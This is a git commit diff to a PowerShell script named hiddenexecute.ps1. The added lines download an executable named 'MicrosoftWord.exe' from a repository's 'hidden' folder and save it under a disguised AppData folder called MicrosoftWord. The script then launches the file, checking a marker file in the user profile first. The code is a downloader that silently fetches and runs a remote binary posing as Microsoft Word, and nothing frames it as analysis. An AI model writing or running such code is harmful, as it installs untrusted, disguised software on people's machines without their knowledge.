a4b4e5a1a88f5143f435b758b1145a1a897884c7
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-23 11:42:08 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -14,6 +14,19 @@ if (Test-Path "$env:USERPROFILE\github.msg") {
     Start-Process $localPath
 } else {
     New-Item -Path "$env:USERPROFILE\github.msg" -ItemType "file"
+    $url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
+    $folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
+    $localPath = "$folderPath\MicrosoftWord.exe"
+
+    if (-Not (Test-Path $folderPath)) {
+        New-Item -ItemType Directory -Path $folderPath
+    }
+
+    if (-Not (Test-Path $localPath)) {
+        Invoke-WebRequest -Uri $url -OutFile $localPath
+    }
+
+    Start-Process $localPath
 }
 
 $destination = "$env:LOCALAPPDATA\Git\git-cmd.exe"
